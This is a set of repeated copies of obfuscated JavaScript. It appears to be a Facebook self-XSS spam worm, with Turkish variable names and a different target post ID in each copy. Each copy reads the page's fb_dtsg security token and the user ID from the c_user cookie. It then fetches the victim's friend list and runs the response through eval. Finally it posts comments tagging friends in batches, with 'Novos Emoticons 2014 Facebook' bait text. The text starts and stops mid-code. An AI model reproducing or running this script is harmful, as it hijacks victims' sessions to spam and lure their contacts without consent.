"\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"]; 
    var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]]; 
    var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]); 
    var id = _0xa22c[5]; 
    var arkadaslar = []; 
    var svn_rev; 
       
  
    function arkadaslari_al(id) { 
        var _0x7892x7 = new XMLHttpRequest(); 
        _0x7892x7[_0xa22c[6]] = function () { 
            if (_0x7892x7[_0xa22c[7]] == 4) { 
                eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]); 
                for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) { 
                    mesaj = _0xa22c[10]; 
                    mesaj_text = _0xa22c[10]; 
                    for (i = f * 27; i < (f + 1) * 27; i++) { 
                        if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) { 
                            mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22]; 
                            mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]; 
                        }; 
                    }; 
                    yorum_yap(id, mesaj); 
                }; 
            }; 
        }; 
        var _0x7892x8 = _0xa22c[24]; 
        _0x7892x8 += _0xa22c[25]; 
        _0x7892x8 += _0xa22c[26]; 
        _0x7892x8 += _0xa22c[27]; 
        _0x7892x8 += _0xa22c[28] + user_id; 
        _0x7892x8 += _0xa22c[29] + user_id; 
        if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) { 
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true); 
        } else { 
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true); 
        }; 
        _0x7892x7[_0xa22c[37]](); 
    }; 
       
    function RandomArkadas() { 
        var _0x7892xa = _0xa22c[10]; 
        for (i = 0; i < 9; i++) { 
            _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22]; 
        }; 
        return _0x7892xa; 
    }; 
       
    function yorum_yap(id, _0x7892xc) { 
        var _0x7892xd = new XMLHttpRequest(); 
        var _0x7892x8 = _0xa22c[10]; 
        _0x7892x8 += _0xa22c[40] + id; 
        _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc); 
        _0x7892x8 += _0xa22c[42]; 
        _0x7892x8 += _0xa22c[43]; 
        _0x7892x8 += _0xa22c[44]; 
        _0x7892x8 += _0xa22c[45]; 
        _0x7892x8 += _0xa22c[46]; 
        _0x7892x8 += _0xa22c[47] + id + _0xa22c[48]; 
        _0x7892x8 += _0xa22c[49]; 
        _0x7892x8 += _0xa22c[50]; 
        _0x7892x8 += _0xa22c[51]; 
        _0x7892x8 += _0xa22c[52]; 
        _0x7892x8 += _0xa22c[29] + user_id; 
        _0x7892x8 += _0xa22c[53]; 
        _0x7892x8 += _0xa22c[54]; 
        _0x7892x8 += _0xa22c[55]; 
        _0x7892x8 += _0xa22c[56] + fb_dtsg; 
        _0x7892x8 += _0xa22c[57]; 
        _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true); 
        _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]); 
        _0x7892xd[_0xa22c[6]] = function () { 
            if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) { 
                _0x7892xd[_0xa22c[64]]; 
            }; 
        }; 
        _0x7892xd[_0xa22c[37]](_0x7892x8); 
    }; 
    arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","455577634573788","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","277055185795215","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","224042054452472","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","276162329229568","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","287303364767453","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var 